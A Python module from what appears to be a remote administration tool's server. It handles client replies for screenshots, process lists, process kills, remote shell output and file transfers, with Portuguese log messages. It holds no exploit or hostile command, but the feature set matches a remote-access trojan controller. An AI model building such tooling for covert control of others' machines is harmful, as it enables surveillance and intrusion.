# server/core/command_processor.py
import logging
import json
import struct
from core.protocol import *
logger = logging.getLogger("server.command_processor")
class CommandProcessor:
    def __init__(self, server):
        self.server = server
    def send_command(self, client_address, command_data):
        if client_address not in self.server.connection_manager.client_handlers:
            logger.error(f"Cliente não encontrado: {client_address}")
            return False
        return self.server.connection_manager.client_handlers[client_address].send_command(command_data)
    def request_process_list(self, client_address, detailed=False):
        if client_address not in self.server.connection_manager.client_handlers:
            logger.error(f"Cliente não encontrado: {client_address}")
            return False
        return self.server.connection_manager.client_handlers[client_address].request_process_list(detailed)
    def request_kill_process(self, client_address, pid):
        if client_address not in self.server.connection_manager.client_handlers:
            logger.error(f"Cliente não encontrado: {client_address}")
            return False
        return self.server.connection_manager.client_handlers[client_address].request_kill_process(pid)
    def process_binary_command(self, client_handler, cmd, data_size=None, data=None):
        if cmd == CMD_UPDATE:
            return self._process_update(client_handler, data_size, data)
        elif cmd == CMD_PONG:
            return True
        elif cmd == CMD_SCREENSHOT_RESPONSE:
            return self._process_screenshot(client_handler, data_size, data)
        elif cmd == CMD_PROCESS_LIST_RESPONSE:
            return self._process_process_list(client_handler, data_size, data)
        elif cmd == CMD_PROCESS_KILL_RESPONSE:
            return self.process_kill_response(client_handler, data_size, data)
        elif cmd == CMD_SHELL_RESPONSE:
            return self.process_shell_response(client_handler, data_size, data)
        else:
            logger.warning(f"Comando desconhecido: {cmd}")
            return False
    def _process_update(self, client_handler, data_size, data):
        if not data:
            logger.error("Dados de atualização inválidos")
            return False
        try:
            update_data = json.loads(data.decode('utf-8'))
            changed = False
            if "cpu_usage" in update_data and client_handler.client_info.get("cpu_usage") != update_data["cpu_usage"]:
                client_handler.client_info["cpu_usage"] = update_data["cpu_usage"]
                self.server.connection_manager.clients[client_handler.client_address]["cpu_usage"] = update_data["cpu_usage"]
                changed = True
            if "ram_usage" in update_data and client_handler.client_info.get("ram_usage") != update_data["ram_usage"]:
                client_handler.client_info["ram_usage"] = update_data["ram_usage"]
                self.server.connection_manager.clients[client_handler.client_address]["ram_usage"] = update_data["ram_usage"]
                changed = True
            if changed and client_handler.update_pending is not None:
                client_handler.update_pending = True
            return True
        except json.JSONDecodeError as e:
            logger.error(f"Erro ao decodificar dados de atualização: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Erro ao processar dados de atualização: {str(e)}")
            return False
    def _process_screenshot(self, client_handler, data_size, data):
        if not data or not data_size:
            logger.error("Dados de screenshot inválidos")
            return False
        if self.server.screenshot_callback:
            self.server.screenshot_callback(client_handler.client_address, data)
            logger.info(f"Screenshot processado para {client_handler.client_key}")
            return True
        return False
    def _process_process_list(self, client_handler, data_size, data):
        if not data:
            logger.error("Dados de lista de processos inválidos")
            return False
        try:
            process_list = json.loads(data.decode('utf-8'))
            logger.info(f"Recebida lista com {len(process_list)} processos")
            if self.server.process_list_callback:
                self.server.process_list_callback(client_handler.client_address, process_list)
                return True
            return False
        except json.JSONDecodeError as e:
            logger.error(f"Erro ao decodificar lista de processos: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Erro ao processar lista de processos: {str(e)}")
            return False
    def process_kill_response(self, client_handler, data_size, data):
        try:
            if not data:
                logger.error("Dados de resposta de encerramento de processo inválidos")
                return False
            response = data.decode('utf-8')
            client_key = f"{client_handler.client_address[0]}:{client_handler.client_address[1]}"
            if response == "OK":
                logger.info(f"Processo encerrado com sucesso pelo cliente {client_key}")
                return True
            else:
                logger.warning(f"Falha ao encerrar processo no cliente {client_key}: {response}")
                return False
        except Exception as e:
            logger.error(f"Erro ao processar resposta de encerramento de processo: {str(e)}")
            return False
    def process_shell_response(self, client_handler, data_size, data):
        try:
            if not data:
                logger.error("Dados de resposta da shell inválidos")
                return False
            client_key = f"{client_handler.client_address[0]}:{client_handler.client_address[1]}"
            logger.info(f"Recebida resposta da shell para {client_key}")
            if hasattr(self.server, 'window_manager') and self.server.window_manager:
                try:
                    self.server.window_manager.process_shell_response(client_handler.client_address, data)
                    return True
                except Exception as e:
                    logger.error(f"Erro ao processar resposta da shell via window_manager: {str(e)}")
            if hasattr(self.server, 'shell_response_callback') and self.server.shell_response_callback:
                try:
                    self.server.shell_response_callback(client_handler.client_address, data)
                    return True
                except Exception as e:
                    logger.error(f"Erro ao processar resposta da shell via callback: {str(e)}")
                    return False
            logger.warning(f"Nenhum handler disponível para processar resposta da shell para {client_key}")
            return False
        except Exception as e:
            logger.error(f"Erro ao processar resposta da shell: {str(e)}")
            return False
    def process_file_response(self, client_handler, cmd, data_size=None, data=None):
        if not data:
            logger.error("Dados de resposta de arquivo inválidos")
            return False
        client_key = f"{client_handler.client_address[0]}:{client_handler.client_address[1]}"
        if hasattr(self.server, 'file_response_callback') and self.server.file_response_callback:
            self.server.file_response_callback(client_handler.client_address, cmd, data)
            return True
        return False
